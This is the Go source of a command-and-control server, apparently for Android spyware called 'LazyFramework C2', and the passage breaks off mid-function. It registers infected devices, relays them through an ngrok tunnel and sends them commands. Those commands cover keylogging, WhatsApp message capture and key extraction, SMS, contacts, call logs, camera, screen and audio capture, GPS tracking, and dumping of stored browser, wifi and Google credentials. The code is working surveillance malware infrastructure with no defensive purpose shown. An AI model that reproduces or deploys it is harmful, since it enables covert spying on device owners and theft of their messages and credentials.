package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "log"
    "net"
    "strings"
    "sync"
    "time"
)

type Server struct {
    config   *Config
    db       *Database
    listener net.Listener
    agents   map[string]*Agent
    mutex    sync.RWMutex
    running  bool
}

type Agent struct {
    ID           string                 `json:"id"`
    Conn         net.Conn               `json:"-"`
    Writer       *bufio.Writer          `json:"-"`
    Reader       *bufio.Reader          `json:"-"`
    Device       string                 `json:"device"`
    Android      string                 `json:"android"`
    Manufacturer string                 `json:"manufacturer"`
    ConnectedAt  time.Time              `json:"connected_at"`
    LastSeen     time.Time              `json:"last_seen"`
    Status       string                 `json:"status"`
    Commands     []Command              `json:"commands"`
    Mirroring    bool                   `json:"mirroring"`
    FrameCount   int                    `json:"frame_count"`
    Keylogs      []string               `json:"keylogs"`
    KeylogHistory []string              `json:"keylog_history"` // ✅ TAMBAHKAN HISTORY
    WhatsApp     *WhatsAppData          `json:"whatsapp"`
    Metadata     map[string]interface{} `json:"metadata"`
}

type Command struct {
    ID          string    `json:"id"`
    Command     string    `json:"command"`
    Params      string    `json:"params"`
    IssuedAt    time.Time `json:"issued_at"`
    Status      string    `json:"status"`
    Result      string    `json:"result"`
    CompletedAt time.Time `json:"completed_at"`
}

type WhatsAppData struct {
    Capturing    bool     `json:"capturing"`
    Messages     []string `json:"messages"`
    MessageCount int      `json:"message_count"`
    KeyFound     bool     `json:"key_found"`
}

type Message struct {
    Type    string          `json:"type"`
    AgentID string          `json:"agent_id,omitempty"`
    Command string          `json:"command,omitempty"`
    Result  json.RawMessage `json:"result,omitempty"`
    Data    json.RawMessage `json:"data,omitempty"`
    Raw     []byte          `json:"-"`
}

type BeaconData struct {
    ID           string `json:"id"`
    Device       string `json:"device"`
    Android      string `json:"android"`
    Manufacturer string `json:"manufacturer"`
    Timestamp    int64  `json:"timestamp"`
}

func NewServer(config *Config, db *Database) *Server {
    return &Server{
        config:   config,
        db:       db,
        agents:   make(map[string]*Agent),
        running:  true,
    }
}

func (s *Server) Start() error {
    listener, err := net.Listen("tcp", s.config.GetAddress())
    if err != nil {
        return fmt.Errorf("failed to start listener: %v", err)
    }
    s.listener = listener

    log.Printf("🚀 C2 Server listening on %s", s.config.GetAddress())
    log.Printf("🌐 Web UI available at http://%s", s.config.GetWebAddress())

    // ✅ TAMBAHKAN INI:
    VerifyNgrokConnection(s.config)
    go s.monitorNgrokTunnel()
    // ✅ SAMPAI SINI

    go StartWebServer(s.config, s)

    for s.running {
        conn, err := listener.Accept()
        if err != nil {
            if !s.running {
                break
            }
            continue
        }
        go s.handleConnection(conn)
    }

    listener.Close()
    return nil
}

// Monitor ngrok tunnel changes every 30 seconds
func (s *Server) monitorNgrokTunnel() {
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    for range ticker.C {
        if !s.running {
            break
        }

        host, port := getNgrokTunnel()
        
        if host != "" && port > 0 {
            if s.config.NgrokHost != host || s.config.NgrokPort != port {
                log.Printf("🔄 Ngrok tunnel changed: %s:%d (was: %s:%d)", 
                    host, port, s.config.NgrokHost, s.config.NgrokPort)
                s.config.NgrokHost = host
                s.config.NgrokPort = port
                SaveConfig(s.config)
                s.BroadcastTunnelUpdate(host, port)
            }
        }
    }
}

// Broadcast tunnel update to all connected agents
func (s *Server) BroadcastTunnelUpdate(host string, port int) {
    s.mutex.RLock()
    defer s.mutex.RUnlock()

    for _, agent := range s.agents {
        updateMsg := map[string]interface{}{
            "type": "tunnel_update",
            "data": map[string]interface{}{
                "host": host,
                "port": port,
            },
        }
        
        if agent.Writer != nil {
            msgBytes, _ := json.Marshal(updateMsg)
            msgBytes = append(msgBytes, '\n')
            agent.Writer.Write(msgBytes)
            agent.Writer.Flush()
            log.Printf("📤 Tunnel update sent to agent: %s", agent.ID)
        }
    }
}

// ==================== GPS DETAIL HANDLER ====================

func (s *Server) handleGPSDetail(agent *Agent, result map[string]interface{}) {
    log.Printf("🛰️ GPS Detail from %s", agent.ID)
    
    // Broadcast ke WebSocket
    BroadcastGPSStatus(agent.ID, result)
}

func (s *Server) Stop() {
    s.running = false
    if s.listener != nil {
        s.listener.Close()
    }

    s.mutex.Lock()
    defer s.mutex.Unlock()

    for _, agent := range s.agents {
        if agent.Conn != nil {
            agent.Conn.Close()
        }
        s.db.UpdateAgentStatus(agent.ID, "offline")
    }
}

func (s *Server) handleConnection(conn net.Conn) {
    defer func() {
        log.Printf("🔌 Connection closed: %s", conn.RemoteAddr())
        conn.Close()
    }()

    reader := bufio.NewReader(conn)
    writer := bufio.NewWriter(conn)

    var agent *Agent

    log.Printf("📡 Handling connection from %s", conn.RemoteAddr())

    for s.running {
        conn.SetReadDeadline(time.Now().Add(60 * time.Second))

        line, err := reader.ReadString('\n')
        if err != nil {
            if agent != nil {
                log.Printf("Agent %s disconnected: %v", agent.ID, err)
                s.removeAgent(agent.ID)
            } else {
                log.Printf("Connection %s error: %v", conn.RemoteAddr(), err)
            }
            return
        }

        line = strings.TrimSpace(line)
        if line == "" {
            continue
        }

        log.Printf("📨 RAW DATA from %s: %s", conn.RemoteAddr(), line[:min(len(line), 200)])

        if !strings.HasPrefix(line, "{") {
            s.handlePlainText(conn, writer, line, &agent)
            continue
        }

        var tempMsg map[string]interface{}
        if err := json.Unmarshal([]byte(line), &tempMsg); err == nil {
            if agentID, ok := tempMsg["agent_id"].(string); ok && agentID != "" {
                s.db.AddAllResponse(agentID, line)
                log.Printf("💾 All response saved for agent: %s", agentID)
            }
        }

        var beaconData map[string]interface{}
        if err := json.Unmarshal([]byte(line), &beaconData); err == nil {
            if msgType, ok := beaconData["type"].(string); ok && msgType == "beacon" {
                id, _ := beaconData["id"].(string)
                device, _ := beaconData["device"].(string)
                android, _ := beaconData["android"].(string)
                manufacturer, _ := beaconData["manufacturer"].(string)

                if id != "" {
                    log.Printf("📡 Beacon from: %s (device: %s)", id, device)
                    beacon := BeaconData{
                        ID:           id,
                        Device:       device,
                        Android:      android,
                        Manufacturer: manufacturer,
                    }
                    agent = s.handleBeaconV2(conn, writer, beacon)
                    if agent != nil {
                       
                        s.sendPendingCommands(agent)
                    }
                    continue
                }
            }
        }

        var msg Message
        if err := json.Unmarshal([]byte(line), &msg); err != nil {
            log.Printf("❌ Invalid JSON: %v - Data: %s", err, line[:min(len(line), 100)])
            continue
        }
        msg.Raw = []byte(line)

        if msg.AgentID != "" {
            agent = s.getAgentByID(msg.AgentID)
        }

        rawCommand := msg.Command
        if strings.HasPrefix(rawCommand, "{") {
            var cmdObj map[string]interface{}
            if err := json.Unmarshal([]byte(rawCommand), &cmdObj); err == nil {
                if cmd, ok := cmdObj["command"].(string); ok && cmd != "" {
                    log.Printf("📨 Extracted command from JSON: %s", cmd)
                    msg.Command = cmd
                }
            }
        }

        log.Printf("📨 Message type: %s, Agent: %s, Command: %s", msg.Type, msg.AgentID, msg.Command)

        switch msg.Type {
        case "response":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    log.Printf("⚠️ Unknown agent: %s", msg.AgentID)
                    continue
                }
            }
            s.handleResponse(agent, msg)

        case "keylog":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    continue
                }
            }
            s.handleKeylog(agent, msg)

        case "mirror_status":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    continue
                }
            }
            s.handleMirrorStatus(agent, msg)

        case "whatsapp_message":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    log.Printf("⚠️ Unknown agent for whatsapp message: %s", msg.AgentID)
                    continue
                }
            }
            s.handleWhatsAppMessage(agent, msg)

        case "social_message":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    log.Printf("⚠️ Unknown agent for social message: %s", msg.AgentID)
                    continue
                }
            }
            s.handleSocialMessage(agent, msg)

        default:
            log.Printf("📨 Unknown message type: %s from %s", msg.Type, msg.AgentID)
            if msg.Command != "" && agent != nil {
                s.handleResponse(agent, msg)
            }
        }
    }
}

func (s *Server) handleBeaconV2(conn net.Conn, writer *bufio.Writer, beacon BeaconData) *Agent {
    agentID := beacon.ID
    if agentID == "" {
        log.Printf("❌ Beacon without ID")
        return nil
    }

    log.Printf("📡 Processing beacon from %s", agentID)

    s.mutex.Lock()
    defer s.mutex.Unlock()

    agent, exists := s.agents[agentID]

    if exists {
        // Reconnect - update koneksi lama
        if agent.Conn != nil && agent.Conn != conn {
            agent.Conn.Close()
        }
        agent.Conn = conn
        agent.Writer = writer
        agent.Reader = bufio.NewReader(conn)
        agent.LastSeen = time.Now()
        agent.Status = "online"

        if beacon.Device != "" {
            agent.Device = beacon.Device
        }
        if beacon.Manufacturer != "" {
            agent.Manufacturer = beacon.Manufacturer
        }

        log.Printf("🔄 Agent reconnected: %s", agentID)
        s.db.UpdateAgentStatus(agentID, "online")
        s.db.UpdateAgentLastSeen(agentID)
    } else {
        // Agent baru
        agent = &Agent{
            ID:           agentID,
            Conn:         conn,
            Writer:       writer,
            Reader:       bufio.NewReader(conn),
            Device:       beacon.Device,
            Android:      beacon.Android,
            Manufacturer: beacon.Manufacturer,
            ConnectedAt:  time.Now(),
            LastSeen:     time.Now(),
            Status:       "online",
            Commands:     []Command{},
            Keylogs:      []string{},
            KeylogHistory: []string{},
            WhatsApp:     &WhatsAppData{},
            Metadata:     make(map[string]interface{}),
        }

        s.agents[agentID] = agent
        log.Printf("✅ New agent connected: %s", agentID)
        s.db.AddAgent(agent)
    }

    // Kirim ACK
    ack := map[string]interface{}{
        "status":   "connected",
        "agent_id": agentID,
        "message":  "Welcome to LazyFramework C2",
        "server":   "LazyFramework C2 v1.0",
        "time":     time.Now().Unix(),
    }
    ackJSON, _ := json.Marshal(ack)
    writer.WriteString(string(ackJSON) + "\n")
    writer.Flush()

    BroadcastAgentUpdate(agent)

    return agent
}

func (s *Server) handlePlainText(conn net.Conn, writer *bufio.Writer, line string, agent **Agent) {
    log.Printf("📨 Plain text: %s", line)

    if *agent == nil {
        s.mutex.RLock()
        for _, a := range s.agents {
            if a.Conn == conn {
                *agent = a
                break
            }
        }
        s.mutex.RUnlock()
    }

    switch line {
    case "PING":
        writer.WriteString("PONG\n")
        writer.Flush()
        log.Printf("📤 PONG sent")

    case "PONG":

    case "HELP", "help":
        help := `=== LazyFramework C2 Commands ===

SYSTEM:
  GET_DEVICE_INFO     - Get device information
  GET_LOCATION        - Get GPS location
  GET_CLIPBOARD       - Get clipboard content
  GET_INSTALLED_APPS  - List installed apps
  GET_ACCOUNTS        - Get device accounts
  GET_GOOGLE_ACCOUNTS - Get Google accounts
  SHOW_TOAST          - Show toast message

FILES:
  GET_CONTACTS        - Get contacts
  GET_SMS             - Get SMS messages
  GET_CALL_LOGS       - Get call logs
  GET_GALLERY         - Get recent photos
  GET_FILES_LIST      - List files in /sdcard

MEDIA:
  CAMERA_SNAPSHOT     - Take photo with camera
  SCREENSHOT          - Capture screen
  RECORD_AUDIO        - Record audio (30s)
  STOP_RECORDING      - Stop recording
  SET_WALLPAPER <url> - Set wallpaper from URL

KEYLOGGER:
  KEYLOG_START        - Start keylogger
  KEYLOG_STATUS       - Get keylogger status
  KEYLOG_STOP         - Stop keylogger
  KEYLOG_DUMP         - Get captured keylogs

SCREEN MIRROR:
  SCREEN_START        - Start screen mirror
  SCREEN_STOP         - Stop screen mirror
  SCREEN_PAUSE        - Pause mirror
  SCREEN_RESUME       - Resume mirror
  SCREEN_INFO         - Get screen info

VIDEO STREAMING:
  VIDEO_STREAM_START  - Start video streaming (H.264)
  VIDEO_STREAM_STOP   - Stop video streaming
  VIDEO_STREAM_STATUS - Get stream status

WHATSAPP:
  WA_INFO             - Get WhatsApp info
  WA_CONTACTS         - Get WhatsApp contacts
  WA_CAPTURE_START    - Start WhatsApp capture
  WA_CAPTURE_STOP     - Stop WhatsApp capture
  WA_CAPTURE_DUMP     - Get captured messages
  WA_CAPTURE_STATS    - Get capture stats
  WA_CAPTURE_CLEAR    - Clear messages
  WA_BACKUP_INFO      - Get backup info
  WA_EXTRACT_KEY      - Extract WhatsApp key
  WA_DECRYPT_DB       - Decrypt database

Type any command above to execute.`
        writer.WriteString(help + "\n")
        writer.Flush()

    default:
        if *agent == nil {
            writer.WriteString("⚠️ Agent not registered. Send beacon first.\n")
            writer.Flush()
            return
        }

        parts := strings.SplitN(line, " ", 2)
        cmd := parts[0]
        params := ""
        if len(parts) > 1 {
            params = parts[1]
        }

        validCommands := map[string]bool{
            "GET_DEVICE_INFO": true, "GET_LOCATION": true, "GET_CLIPBOARD": true,
            "GET_INSTALLED_APPS": true, "GET_CONTACTS": true, "GET_SMS": true,
            "GET_CALL_LOGS": true, "GET_GALLERY": true, "GET_FILES_LIST": true,
            "RECORD_AUDIO": true, "STOP_RECORDING": true,
            "KEYLOG_START": true, "KEYLOG_STOP": true, "KEYLOG_DUMP": true, "KEYLOG_STATUS": true,
            "WA_INFO": true, "WA_CONTACTS": true,
            "WA_CAPTURE_START": true, "WA_CAPTURE_STOP": true,
            "WA_CAPTURE_DUMP": true, "WA_CAPTURE_STATS": true,
            "WA_CAPTURE_CLEAR": true, "WA_BACKUP_INFO": true,
            "WA_EXTRACT_KEY": true, "WA_DECRYPT_DB": true,
            "GET_ACCOUNTS": true, "GET_GOOGLE_ACCOUNTS": true,
            "CAMERA_SNAPSHOT": true, "SCREENSHOT": true,
            "SCREEN_START": true, "SCREEN_STOP": true,
            "SCREEN_PAUSE": true, "SCREEN_RESUME": true,
            "SCREEN_INFO": true, "SHOW_TOAST": true,
            "VIDEO_STREAM_START": true, "VIDEO_STREAM_STOP": true,
            "VIDEO_STREAM_STATUS": true,
        }

        if validCommands[cmd] {
            cmdID := generateID()
            command := Command{
                ID:        cmdID,
                Command:   line,
                Params:    params,
                IssuedAt:  time.Now(),
                Status:    "pending",
            }

            s.db.AddCommand((*agent).ID, command)

            cmdJSON, _ := json.Marshal(map[string]interface{}{
                "command": line,
                "id":      cmdID,
            })
            writer.WriteString(string(cmdJSON) + "\n")
            writer.Flush()

            command.Status = "sent"
            s.db.UpdateCommandStatus(cmdID, "sent")

            log.Printf("📤 Command sent to %s: %s (ID: %s)", (*agent).ID, line, cmdID)
            writer.WriteString(fmt.Sprintf("✅ Command sent: %s (ID: %s)\n", line, cmdID))
            writer.Flush()
        } else {
            writer.WriteString(fmt.Sprintf("❌ Unknown command: %s. Type HELP for available commands.\n", cmd))
            writer.Flush()
        }
    }
}

func (s *Server) sendPendingCommands(agent *Agent) {
    commands := s.db.GetPendingCommands(agent.ID)
    if len(commands) == 0 {
        return
    }

    log.Printf("📤 Sending %d pending commands to %s", len(commands), agent.ID)

    for _, cmd := range commands {
        cmdJSON, _ := json.Marshal(map[string]interface{}{
            "command": cmd.Command,
            "id":      cmd.ID,
        })
        agent.Writer.WriteString(string(cmdJSON) + "\n")
        agent.Writer.Flush()

        cmd.Status = "sent"
        s.db.UpdateCommandStatus(cmd.ID, "sent")
        log.Printf("📤 Pending command sent: %s", cmd.Command)
    }
}

// ==================== HANDLE RESPONSE ====================

func (s *Server) handleResponse(agent *Agent, msg Message) {
    // ✅ CEK SOCIAL MESSAGE DULU
    if msg.Type == "social_message" {
        s.handleSocialMessage(agent, msg)
        return
    }

    var result map[string]interface{}
    if err := json.Unmarshal(msg.Result, &result); err != nil {
        log.Printf("❌ Invalid result: %v", err)
        log.Printf("❌ Raw result: %s", string(msg.Result))
        return
    }

    agent.LastSeen = time.Now()
    s.db.UpdateAgentLastSeen(agent.ID)

    cmdType := msg.Command
    log.Printf("📥 Raw command from agent: %s", cmdType)

    if strings.HasPrefix(cmdType, "{") {
        var cmdObj map[string]interface{}
        if err := json.Unmarshal([]byte(cmdType), &cmdObj); err == nil {
            if cmd, ok := cmdObj["command"].(string); ok && cmd != "" {
                cmdType = cmd
                log.Printf("📥 Extracted command from JSON: %s", cmdType)
            }
            if id, ok := cmdObj["id"].(string); ok && id != "" {
                if _, ok := result["command_id"]; !ok {
                    result["command_id"] = id
                }
            }
        }
    }

    if cmdType == "" {
        if cmd, ok := result["command"].(string); ok && cmd != "" {
            cmdType = cmd
            log.Printf("📥 Extracted command from result: %s", cmdType)
        }
    }

    log.Printf("📥 Response from %s: %s", agent.ID, cmdType)

    resultJSON, _ := json.Marshal(result)
    log.Printf("📥 Result: %s", string(resultJSON))

    s.db.AddResponse(agent.ID, cmdType, string(msg.Result))

    cmdID := ""
    if id, ok := result["command_id"].(string); ok && id != "" {
        cmdID = id
    } else if id, ok := result["id"].(string); ok && id != "" {
        cmdID = id
    } else if id, ok := result["command_id"].(float64); ok {
        cmdID = fmt.Sprintf("%.0f", id)
    }

    if cmdID != "" {
        s.db.UpdateCommandResult(cmdID, string(msg.Result))
        s.db.UpdateCommandStatus(cmdID, "completed")
        log.Printf("📥 Updated command status: %s", cmdID)
    }

    // server.go - GANTI bagian KEYLOG_DUMP di handleResponse()

if cmdType == "KEYLOG_DUMP" {
    log.Printf("⌨️ PROCESSING KEYLOG_DUMP from %s", agent.ID)

    var logs string
    var keystrokeCount int = 0
    var isLogging bool = false
    var queueSize int = 0
    var historySize int = 0

    // ✅ AMBIL LOGS DARI RESPONSE
    if l, ok := result["logs"].(string); ok && l != "" {
        logs = l
        log.Printf("⌨️ Found logs field: %d bytes", len(logs))
    } else if l, ok := result["data"].(string); ok && l != "" {
        logs = l
        log.Printf("⌨️ Found data field: %d bytes", len(logs))
    } else if l, ok := result["result"].(string); ok && l != "" {
        logs = l
        log.Printf("⌨️ Found result field: %d bytes", len(logs))
    }

    // ✅ AMBIL METADATA
    if count, ok := result["count"].(float64); ok {
        keystrokeCount = int(count)
    }
    if val, ok := result["is_logging"].(bool); ok {
        isLogging = val
    }
    if val, ok := result["queue_size"].(float64); ok {
        queueSize = int(val)
    }
    if val, ok := result["history_size"].(float64); ok {
        historySize = int(val)
    }

    // ✅ SIMPAN KE HISTORY AGENT
    if logs != "" && len(logs) > 10 {
        // Simpan ke history
        agent.KeylogHistory = append(agent.KeylogHistory, logs)
        if len(agent.KeylogHistory) > 10 {
            agent.KeylogHistory = agent.KeylogHistory[1:]
        }
        
        // Simpan ke database
        s.db.AddKeylogs(agent.ID, logs)
        log.Printf("⌨️ ✅ Keylog saved: %d bytes, count: %d", len(logs), keystrokeCount)

        // ✅ BROADCAST DENGAN DATA LENGKAP
        BroadcastKeylogFull(agent.ID, logs, keystrokeCount, isLogging, queueSize, historySize)
        BroadcastResponse(agent.ID, cmdType, result)

    } else {
        // ✅ TIDAK ADA LOGS - TAMPILKAN DEBUG INFO
        log.Printf("⌨️ ❌ No keylog data found!")
        
        debugInfo := fmt.Sprintf(
            "No keylogs captured yet.\n\n📋 DEBUG INFO:\n  - Total keystrokes: %d\n  - Queue size: %d\n  - History size: %d\n  - Logging: %v\n\n💡 Make sure Accessibility Service is ENABLED and type something.",
            keystrokeCount, queueSize, historySize, isLogging,
        )
        
        BroadcastKeylogFull(agent.ID, debugInfo, keystrokeCount, isLogging, queueSize, historySize)
        BroadcastResponse(agent.ID, cmdType, result)
    }

    BroadcastAgentUpdate(agent)
    return
}

    switch cmdType {
    case "GET_DEVICE_INFO":
        s.handleDeviceInfo(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_LOCATION":
        s.handleLocation(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)
        
    case "GPS_DETAIL":
    s.handleGPSDetail(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)
        
    case "LOCATION_TRACK_START":
    s.handleLocationTrackStart(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)
    
case "LOCATION_TRACK_STOP":
    s.handleLocationTrackStop(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "LOCATION_TRACK_STATUS":
    s.handleLocationTrackStatus(agent, result)
    // This should broadcast to WebSocket
    BroadcastLocationStatus(agent.ID, result)

case "LOCATION_HISTORY":
    s.handleLocationHistory(agent, result)
    BroadcastLocationHistory(agent.ID, result)

    case "WA_CAPTURE_DUMP":
        s.handleWhatsAppDump(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "KEYLOG_START":
        log.Printf("⌨️ KEYLOG_START response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "KEYLOG_STOP":
        log.Printf("⌨️ KEYLOG_STOP response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "KEYLOG_STATUS":
        log.Printf("⌨️ KEYLOG_STATUS response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "SCREENSHOT":
        s.handleScreenshot(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "CAMERA_SNAPSHOT":
        s.handleCameraSnapshot(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)
        
  

    case "SCREEN_FRAME":
        s.handleScreenFrame(agent, result)
        BroadcastFrame(agent.ID, result)

    case "VIDEO_FRAME":
        s.handleVideoFrame(agent, result)
        BroadcastVideoFrame(agent.ID, result)

    case "WA_DECRYPT_DB":
        s.handleWhatsAppDecrypt(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "SCREEN_START":
        log.Printf("📸 SCREEN_START response from %s", agent.ID)
        if status, ok := result["status"].(string); ok {
            log.Printf("📸 Status: %s", status)
            if status == "success" || status == "pending" {
                agent.Mirroring = true
                s.db.UpdateAgentMirrorStatus(agent.ID, true)
                log.Printf("📸 Mirror status set to TRUE for %s", agent.ID)
            }
        }
        if active, ok := result["mirror_active"].(bool); ok {
            agent.Mirroring = active
            s.db.UpdateAgentMirrorStatus(agent.ID, active)
            log.Printf("📸 Mirror active: %v", active)
        }
        BroadcastResponse(agent.ID, cmdType, result)

    case "SCREEN_STOP":
        log.Printf("⏹️ SCREEN_STOP response from %s", agent.ID)
        agent.Mirroring = false
        s.db.UpdateAgentMirrorStatus(agent.ID, false)
        BroadcastResponse(agent.ID, cmdType, result)

    case "SCREEN_PAUSE":
        log.Printf("⏸️ SCREEN_PAUSE response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "SCREEN_RESUME":
        log.Printf("▶️ SCREEN_RESUME response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "SCREEN_INFO":
        log.Printf("📺 SCREEN_INFO response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "VIDEO_STREAM_START":
        log.Printf("🎬 VIDEO_STREAM_START response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "VIDEO_STREAM_STOP":
        log.Printf("⏹️ VIDEO_STREAM_STOP response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "VIDEO_STREAM_STATUS":
        log.Printf("📊 VIDEO_STREAM_STATUS response from %s", agent.ID)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_CLIPBOARD":
        s.handleClipboard(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_INSTALLED_APPS":
        s.handleInstalledApps(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_CONTACTS":
        s.handleContacts(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_SMS":
        s.handleSMS(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_CALL_LOGS":
        s.handleCallLogs(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    
    // Di server.go, handleResponse() tambahkan:

case "GET_FILES_LIST":
    s.handleFilesListResponse(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)
    if path, ok := result["path"].(string); ok {
        log.Printf("📁 Files list for path: %s", path)
    }
        
    case "DOWNLOAD_FILE":
    s.handleDownloadFileResponse(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)
    
    // Di handleResponse(), tambahkan case:

case "DELETE_FILE":
    s.handleDeleteFileResponse(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)  // ← Ganti actualCmd → cmdType

case "MOVE_FILE":
    s.handleMoveFileResponse(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)  // ← Ganti actualCmd → cmdType

    case "RECORD_AUDIO":
        s.handleRecordAudio(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "STOP_RECORDING":
        s.handleStopRecording(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "SET_WALLPAPER":
        s.handleSetWallpaper(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_INFO":
        s.handleWAInfo(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_CONTACTS":
        s.handleWAContacts(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_CAPTURE_START":
        s.handleWACaptureStart(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_CAPTURE_STOP":
        s.handleWACaptureStop(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_CAPTURE_STATS":
        s.handleWACaptureStats(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_CAPTURE_CLEAR":
        s.handleWACaptureClear(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_BACKUP_INFO":
        s.handleWABackupInfo(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "WA_EXTRACT_KEY":
        s.handleWAExtractKey(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_ACCOUNTS":
        s.handleGetAccounts(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "GET_GOOGLE_ACCOUNTS":
        s.handleGetGoogleAccounts(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)
        
    case "GET_GALLERY":
        s.handleGallery(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)
        
    // server.go - Di handleResponse() tambahkan case untuk browser commands

case "BROWSER_INFO":
    s.handleBrowserInfo(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "BROWSER_HISTORY":
    s.handleBrowserHistory(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "BROWSER_BOOKMARKS":
    s.handleBrowserBookmarks(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "BROWSER_TABS":
    s.handleBrowserTabs(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "BROWSER_ALL":
    s.handleBrowserAll(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)
    
    case "DUMP_CREDENTIALS":
    s.handleDumpCredentials(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "GET_WIFI_PASSWORDS":
    s.handleWifiPasswords(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "GET_BROWSER_PASSWORDS":
    s.handleBrowserPasswords(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

case "GET_GOOGLE_TOKENS":
    s.handleGoogleTokens(agent, result)
    BroadcastResponse(agent.ID, cmdType, result)

    case "SHOW_TOAST":
        s.handleShowToast(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)

    case "HELP":
        s.handleHelp(agent, result)
        BroadcastResponse(agent.ID, cmdType, result)
    
    default:
        log.Printf("📨 Unknown command type: %s, but broadcasting anyway", cmdType)
        BroadcastResponse(agent.ID, cmdType, result)
    }

    BroadcastAgentUpdate(agent)
}

// server.go - Tambahkan di bagian ADDITIONAL HANDLERS

// ==================== LOCATION TRACKING HANDLERS ====================

func (s *Server) handleLocationTrackStart(agent *Agent, result map[string]interface{}) {
    log.Printf("📍 Location tracking STARTED for %s", agent.ID)
    if interval, ok := result["interval"].(float64); ok {
        log.Printf("📍 Tracking interval: %d seconds", int(interval))
    }
    if agent.Metadata == nil {
        agent.Metadata = make(map[string]interface{})
    }
    agent.Metadata["location_tracking"] = true
    agent.Metadata["location_tracking_started"] = time.Now().Unix()
    s.db.UpdateAgentMetadata(agent.ID, "location_tracking", true)
    s.db.UpdateAgentMetadata(agent.ID, "location_tracking_started", time.Now().Unix())
}

func (s *Server) handleLocationTrackStop(agent *Agent, result map[string]interface{}) {
    log.Printf("📍 Location tracking STOPPED for %s", agent.ID)
    if agent.Metadata == nil {
        agent.Metadata = make(map[string]interface{})
    }
    agent.Metadata["location_tracking"] = false
    s.db.UpdateAgentMetadata(agent.ID, "location_tracking", false)
}

func (s *Server) handleLocationTrackStatus(agent *Agent, result map[string]interface{}) {
    log.Printf("📍 Location tracking STATUS for %s", agent.ID)
    // Broadcast status to WebSocket clients
    BroadcastLocationStatus(agent.ID, result)
}

func (s *Server) handleLocationHistory(agent *Agent, result map[string]interface{}) {
    log.Printf("📍 Location HISTORY for %s", agent.ID)
    
    // Save to database
    if history, ok := result["history"].([]interface{}); ok {
        log.Printf("📍 History entries: %d", len(history))
        for _, entry := range history {
            if loc, ok := entry.(map[string]interface{}); ok {
                s.db.AddLocationHistory(agent.ID, loc)
            }
        }
    }
    
    // Also save the latest location to agent
    if data, ok := result["data"].(map[string]interface{}); ok {
        if lat, ok := data["latitude"].(float64); ok {
            if lng, ok := data["longitude"].(float64); ok {
                s.db.UpdateAgentLocation(agent.ID, lat, lng)
            }
        }
    }
    
    BroadcastLocationHistory(agent.ID, result)
}

// Make sure you have these broadcast functions
func BroadcastLocationStatus(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "location_status",
        "agent_id":  agentID,
        "data":      result,
        "timestamp": time.Now().Unix(),
    }

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket location broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func BroadcastLocationHistory(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "location_history",
        "agent_id":  agentID,
        "data":      result,
